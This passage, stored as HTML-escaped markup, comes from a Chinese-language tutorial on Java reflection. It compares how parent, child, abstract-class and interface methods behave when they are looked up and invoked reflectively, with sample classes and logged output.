gt;具体方法的继承与重写&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;先准备一个父类，有三个方法，分别是public，protected，private。&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code readability=&quot;6&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;Parent&lt;/span&gt; {&lt;/span&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;m1&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Parent.m1&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;protected&lt;/span&gt; String &lt;span&gt;m2&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Parent.m2&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;private&lt;/span&gt; String &lt;span&gt;m3&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Parent.m3&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;再准备一个子类，继承上面的父类，也有三个相同的方法。&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code readability=&quot;6&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;Child&lt;/span&gt; &lt;span&gt;extends&lt;/span&gt; &lt;span&gt;Parent&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;m1&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Child.m1&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;protected&lt;/span&gt; String &lt;span&gt;m2&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Child.m2&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;private&lt;/span&gt; String &lt;span&gt;m3&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Child.m3&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;public和protected是对父类方法的重写，private自然不能重写。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;首先&lt;/span&gt;&lt;span&gt;，通过反射获取父类和子类的方法m1，并输出：&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code readability=&quot;2&quot;&gt;Method pm1 = Parent.&lt;span&gt;class&lt;/span&gt;.getDeclaredMethod(&lt;span&gt;&quot;m1&quot;&lt;/span&gt;);&lt;br/&gt;Method cm1 = Child.&lt;span&gt;class&lt;/span&gt;.getDeclaredMethod(&lt;span&gt;&quot;m1&quot;&lt;/span&gt;);&lt;p&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(pm1);&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(cm1);&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;java&lt;/span&gt;&lt;span&gt;.lang&lt;/span&gt;&lt;span&gt;.String&lt;/span&gt; &lt;span&gt;org&lt;/span&gt;&lt;span&gt;.cnt&lt;/span&gt;&lt;span&gt;.java&lt;/span&gt;&lt;span&gt;.reflect&lt;/span&gt;&lt;span&gt;.method&lt;/span&gt;&lt;span&gt;.Parent&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;()&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;java&lt;/span&gt;&lt;span&gt;.lang&lt;/span&gt;&lt;span&gt;.String&lt;/span&gt; &lt;span&gt;org&lt;/span&gt;&lt;span&gt;.cnt&lt;/span&gt;&lt;span&gt;.java&lt;/span&gt;&lt;span&gt;.reflect&lt;/span&gt;&lt;span&gt;.method&lt;/span&gt;&lt;span&gt;.Child&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;()&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;可以看到，一个是父类的方法，一个是子类的方法。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;其次&lt;/span&gt;&lt;span&gt;，比较下这两个方法是否相同或相等：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(&lt;span&gt;&quot;pm1 == cm1 -&amp;gt; {}&quot;&lt;/span&gt;, pm1 == cm1);&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(&lt;span&gt;&quot;pm1.equals(cm1) -&amp;gt; {}&quot;&lt;/span&gt;, pm1.equals(cm1));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输入如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;pm1 == cm1 -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;pm1.&lt;span&gt;equals&lt;/span&gt;(cm1) -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;它们既不相同也不相等，因为一个在父类里，一个在子类里，它们各有各的源码，互相独立。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;然后&lt;/span&gt;&lt;span&gt;，实例化父类和子类对象：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Parent&lt;/span&gt; p = &lt;span&gt;new&lt;/span&gt; &lt;span&gt;Parent&lt;/span&gt;();&lt;br/&gt;Child c = &lt;span&gt;new&lt;/span&gt; Child();&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;接着&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;父类方法&lt;/span&gt;&lt;span&gt;分别在&lt;/span&gt;&lt;span&gt;父类&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;子类&lt;/span&gt;&lt;span&gt;对象上&lt;/span&gt;&lt;span&gt;反射&lt;/span&gt;&lt;span&gt;调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;pm1&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;p&lt;/span&gt;));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;pm1&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;c&lt;/span&gt;));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Parent&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Child&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;父类方法在父类对象上反射调用输出Parent.m1，这很好理解。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;父类方法在子类对象上反射调用输出Child.m1，初次看到的话，还是有一些新鲜的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;明明调用的是父类版本的Method，输出的却是子类重写版本的结果。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;然后&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;子类方法&lt;/span&gt;&lt;span&gt;分别在&lt;/span&gt;&lt;span&gt;父类&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;子类&lt;/span&gt;&lt;span&gt;对象上&lt;/span&gt;&lt;span&gt;反射&lt;/span&gt;&lt;span&gt;调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;cm1&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;p&lt;/span&gt;));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;cm1&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;c&lt;/span&gt;));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;IllegalArgumentException&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Child&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;子类方法在父类对象上反射调用时&lt;/span&gt;&lt;span&gt;报错&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;子类方法在子类对象上反射调用时输出Child.m1，这很好理解&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;按照同样的方式，对方法&lt;/span&gt;&lt;span&gt;m2&lt;/span&gt;&lt;span&gt;进行测试，得到的结果和&lt;/span&gt;&lt;span&gt;m1&lt;/span&gt;&lt;span&gt;一样。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;它们一个是public的，一个是protected的，对于继承与重写来说是一样的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;然后再对方法&lt;/span&gt;&lt;span&gt;m3&lt;/span&gt;&lt;span&gt;进行测试，它是&lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt;的，看看会有什么不同。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;首先&lt;/span&gt;&lt;span&gt;，父类方法分别在父类和子类对象上反射调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;pm3&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;p&lt;/span&gt;));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;pm3&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;c&lt;/span&gt;));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输入如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Parent&lt;/span&gt;&lt;span&gt;.m3&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Parent&lt;/span&gt;&lt;span&gt;.m3&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;可以看到，输出的都是&lt;/span&gt;&lt;span&gt;父类&lt;/span&gt;&lt;span&gt;里的内容，和上面确实有所不同。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;其次&lt;/span&gt;&lt;span&gt;，子类方法分别在父类和子类对象上反射调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;cm3&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;p&lt;/span&gt;));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;cm3&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;c&lt;/span&gt;));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;IllegalArgumentException&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Child&lt;/span&gt;&lt;span&gt;.m3&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;子类方法在父类对象上反射调用时&lt;/span&gt;&lt;span&gt;报错&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;子类方法在子类对象上反射调用时输出Child.m3。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;抽象方法的继承与重写&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;再大胆一点，使用&lt;/span&gt;&lt;span&gt;抽象&lt;/span&gt;&lt;span&gt;方法来测试下。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;先准备一个抽象父类，有两个抽象方法。&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code readability=&quot;4&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; &lt;span&gt;Parent2&lt;/span&gt; {&lt;p&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; String &lt;span&gt;m1&lt;/span&gt;()&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; String &lt;span&gt;m2&lt;/span&gt;()&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;再准备一个子类，继承这个父类，并重写抽象方法。&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code readability=&quot;4&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;Child2&lt;/span&gt; &lt;span&gt;extends&lt;/span&gt; &lt;span&gt;Parent2&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;m1&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Child2.m1&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;protected&lt;/span&gt; String &lt;span&gt;m2&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Child2.m2&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;使用反射分别获取父类和子类的方法m1，并输出下：&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code readability=&quot;2&quot;&gt;&lt;span&gt;public&lt;/span&gt; abstract java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Parent2.m1()&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Child2.m1()&lt;p&gt;pm1 == cm1 -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;pm1.&lt;span&gt;equals&lt;/span&gt;(cm1) -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;可以看到父类方法是&lt;/span&gt;&lt;span&gt;抽象&lt;/span&gt;&lt;span&gt;的，子类重写后变为非抽象的，这两个方法既不相同也不相等。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;由于父类是抽象类，不能实例化，因此只能在子类对象上反射调用这两个方法：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;pm1&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;c2&lt;/span&gt;));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;&lt;span&gt;.log&lt;/span&gt;(&lt;span&gt;cm1&lt;/span&gt;&lt;span&gt;.invoke&lt;/span&gt;(&lt;span&gt;c2&lt;/span&gt;));&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Child2&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Child2&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;没有报错。且输出正常，是不是又有一丝新鲜感，&lt;/span&gt;&lt;span&gt;抽象&lt;/span&gt;&lt;span&gt;方法也可以被反射调用。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对方法&lt;/span&gt;&lt;span&gt;m2&lt;/span&gt;&lt;span&gt;进行测试，得到相同的结果，因为&lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt;对于继承与重写的规则是一样的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;接口方法的实现与继承&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;胆子渐渐大起来，再用接口来试试。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;准备一个接口，包含抽象方法，默认方法和静态方法。&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code readability=&quot;6&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt; &lt;span&gt;Inter&lt;/span&gt; {&lt;p&gt;&lt;span&gt;String &lt;span&gt;m1&lt;/span&gt;()&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;default&lt;/span&gt; String &lt;span&gt;m2&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Inter.m2&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;default&lt;/span&gt; String &lt;span&gt;m3&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Inter.m3&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;static&lt;/span&gt; String &lt;span&gt;m4&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Inter.m4&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;准备一个实现类，实现这个接口，实现方法m1，重写方法m2。&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code readability=&quot;6&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;Impl&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;Inter&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;m1&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Impl.m1&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;m2&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Impl.m2&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; String &lt;span&gt;m5&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;Impl.m5&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;分别从接口和实现类获取方法m1，并输出：&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code readability=&quot;2&quot;&gt;&lt;span&gt;public&lt;/span&gt; abstract java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Inter.m1()&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Impl.m1()&lt;p&gt;im1 == cm1 -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;im1.&lt;span&gt;equals&lt;/span&gt;(cm1) -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;可以看到接口中的方法是&lt;/span&gt;&lt;span&gt;抽象&lt;/span&gt;&lt;span&gt;的。因为它没有方法体。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;因为接口不能实例化，所以这两个方法只能在实现类上反射调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code readability=&quot;2&quot;&gt;Impl c = &lt;span&gt;new&lt;/span&gt; Impl();&lt;p&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(im1.invoke(c));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(cm1.invoke(c));&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Impl&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Impl&lt;/span&gt;&lt;span&gt;.m1&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;没有报错，输出正常，又一丝的新鲜，接口里的方法也可以通过反射调用。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对&lt;/span&gt;&lt;span&gt;m2&lt;/span&gt;&lt;span&gt;进行测试，m2是接口的&lt;/span&gt;&lt;span&gt;默认&lt;/span&gt;&lt;span&gt;方法，且被实现类&lt;/span&gt;&lt;span&gt;重新实现&lt;/span&gt;&lt;span&gt;了。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;输出下接口中的m2和实现类中的m2，如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code readability=&quot;2&quot;&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Inter.m2()&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; java.lang.&lt;span&gt;String&lt;/span&gt; org.cnt.java.reflect.method.Impl.m2()&lt;p&gt;im2 == cm2 -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;im2.&lt;span&gt;equals&lt;/span&gt;(cm2) -&amp;gt; &lt;span&gt;false&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;这两个方法既不相同也不相等。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;把它们分别在实现类上反射调用：&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;code readability=&quot;2&quot;&gt;Impl c = &lt;span&gt;new&lt;/span&gt; Impl();&lt;p&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(im2.invoke(c));&lt;br/&gt;&lt;span&gt;Log&lt;/span&gt;.&lt;span&gt;log&lt;/span&gt;(cm2.invoke(c));&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;输出如下：&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&lt;span&gt;Impl&lt;/span&gt;&lt;span&gt;.m2&lt;/span&gt;&lt;br/&gt;&lt;span&gt;Impl&lt;/span&gt;&lt;span&gt;.m2&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;br/&gt;&lt;span&gt;因为实现类重写了接口默认方法，所以输出的都是重写后的内容。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对&lt;/span&gt;&lt;span&gt;m3&lt;/span&gt;&lt;span&gt;进行测试，m3也是接口的&lt;/span&gt;&lt;span&gt;默认&lt;/span&gt;&lt;span&gt;方法，不过实现类&lt;/span&gt;&lt;span&gt;没有&lt;/span&gt;&lt;span&gt;重新实现它，而是选择&lt;/span&gt;&lt;span&gt;使用&lt;/span&gt;&lt;span&gt;接口的默认实现。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;同样从接口和实现类分别获取这个方法，并输出：&lt;/span&gt;&lt;/p&gt;
&lt;pre readability=&quot;4&quot;&gt;
